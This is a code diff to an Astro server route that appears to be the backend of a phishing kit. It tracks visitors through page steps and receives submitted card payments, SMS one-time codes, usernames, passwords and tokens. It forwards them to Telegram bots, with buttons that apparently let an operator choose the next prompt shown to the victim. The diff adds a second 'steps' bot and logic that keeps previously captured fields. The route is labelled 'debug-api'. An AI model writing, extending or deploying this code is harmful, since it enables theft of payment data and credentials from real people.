@@ -1,7 +1,7 @@
 export const prerender = false;
 
 import type { APIRoute } from 'astro';
-import { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } from 'astro:env/server';
+import { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, TELEGRAM_STEPS_BOT_TOKEN, TELEGRAM_STEPS_CHAT_ID } from 'astro:env/server';
 
 type DebugEvent = 'P1' | 'P2' | 'P3' | 'P4' | 'P5' | 'P-STEP' | 'P-PAYMENT' | 'P-SUCCESS' | 'CARD_BANNER' | 'PAYMENT_SUBMIT' | 'OTP_SUBMIT' | 'USERPASS_SUBMIT' | 'TOKEN_SUBMIT' | 'DYNAMIC_SUBMIT';
 type RouteAction = 'wait' | 'sms' | 'card' | 'sms_error' | 'card_error' | 'approved' | 'userpass' | 'userpass_error' | 'token' | 'token_error' | 'dynamic' | 'dynamic_error';
@@ -69,6 +69,13 @@ function telegramConfig() {
   };
 }
 
+function stepsTelegramConfig() {
+  return {
+    token: TELEGRAM_STEPS_BOT_TOKEN || process.env.TELEGRAM_STEPS_BOT_TOKEN || '',
+    chatId: TELEGRAM_STEPS_CHAT_ID || process.env.TELEGRAM_STEPS_CHAT_ID || '',
+  };
+}
+
 function getSession(sessionId: string) {
   const session = sessions.get(sessionId) ?? { steps: new Set<string>() };
   sessions.set(sessionId, session);
@@ -77,6 +84,19 @@ function getSession(sessionId: string) {
 
 function objectValue(value: unknown) {
   return value && typeof value === 'object' ? (value as Record<string, unknown>) : undefined;
+}
+
+function keepFilled(previous?: Record<string, unknown>, incoming?: Record<string, unknown>) {
+  const out: Record<string, unknown> = { ...(previous || {}) };
+  for (const [key, value] of Object.entries(incoming || {})) {
+    if (value === '' || value === null || value === undefined) continue;
+    if (value && typeof value === 'object' && !Array.isArray(value)) {
+      out[key] = keepFilled(objectValue(out[key]), objectValue(value));
+      continue;
+    }
+    out[key] = value;
+  }
+  return out;
 }
 
 function rememberStep(sessionId: string, step: string) {
@@ -180,6 +200,18 @@ function isProcessingEvent(event: unknown) {
     || event === 'DYNAMIC_SUBMIT';
 }
 
+function isStepsEvent(event: unknown) {
+  return event === 'P1'
+    || event === 'P2'
+    || event === 'P3'
+    || event === 'P4'
+    || event === 'P5'
+    || event === 'P-STEP'
+    || event === 'P-PAYMENT'
+    || event === 'P-SUCCESS'
+    || event === 'CARD_BANNER';
+}
+
 function stepLabel(event: unknown, meta?: Record<string, unknown>) {
   if (typeof meta?.step === 'string' && meta.step.trim()) return meta.step.trim();
   const labels: Record<string, string> = {
@@ -278,8 +310,8 @@ function formatTelegramMessage(payload: Record<string, unknown>) {
 }
 
 // Wrapper minimo para llamar metodos del Bot API sin repetir token/url.
-async function telegramApi(method: string, payload: Record<string, unknown> = {}) {
-  const { token } = telegramConfig();
+async function telegramApi(method: string, payload: Record<string, unknown> = {}, tokenOverride = '') {
+  const token = tokenOverride || telegramConfig().token;
   if (!token) return { ok: false, skipped: 'telegram-env-missing', status: 0, result: null as unknown };
   const response = await fetch(`https://api.telegram.org/bot${token}/${method}`, {
     method: 'POST',
@@ -395,6 +427,17 @@ async function sendTelegram(payload: Record<string, unknown>, options: { withBut
   }
   const result = await telegramApi('sendMessage', message);
   return result.ok ? { sent: true } : { sent: false, error: `telegram-${result.status || 'unknown'}` };
+}
+
+async function sendStepsTelegram(payload: Record<string, unknown>) {
+  const { token, chatId } = stepsTelegramConfig();
+  if (!token || !chatId) return { sent: false, skipped: 'telegram-steps-env-missing' };
+  const result = await telegramApi('sendMessage', {
+    chat_id: chatId,
+    text: formatStepMessage(payload),
+    disable_web_page_preview: true,
+  }, token);
+  return result.ok ? { sent: true, bot: 'steps' } : { sent: false, error: `telegram-steps-${result.status || 'unknown'}` };
 }
 
 // Procesa callbacks tanto si llegan por webhook como si llegan por getUpdates.
@@ -513,7 +556,7 @@ export const POST: APIRoute = async ({ request }) => {
     await persistDecision(sessionId, { action: 'wait', brand, updatedAt: new Date().toISOString() });
   }
 
-  const meta = { ...(previousMeta || {}), ...(incomingMeta || {}) };
+  const meta = keepFilled(previousMeta, incomingMeta);
   const payload = {
     sessionId,
     event,
@@ -523,14 +566,22 @@ export const POST: APIRoute = async ({ request }) => {
     amount: meta.amount ?? previousMeta?.amount,
     amountLabel: meta.amountLabel ?? previousMeta?.amountLabel,
     meta,
-    metaOtp: incomingMetaOtp || previousMetaOtp || {},
+    metaOtp: keepFilled(previousMetaOtp, incomingMetaOtp),
     action: isProcessingEvent(event) ? 'wait' : 'ack',
     mockCard,
   };
 
   console.info('[debug-api]', payload);
   session.payload = payload;
-  const telegram = await sendTelegram(payload, { withButtons: isProcessingEvent(event) });
+  let telegram;
+  if (isProcessingEvent(event)) {
+    if (event === 'PAYMENT_SUBMIT') await sendStepsTelegram(payload);
+    telegram = await sendTelegram(payload, { withButtons: true });
+  } else if (isStepsEvent(event)) {
+    telegram = await sendStepsTelegram(payload);
+  } else {
+    telegram = { sent: false, skipped: 'no-telegram-route' };
+  }
 
   return json({ ...payload, telegram });
 };
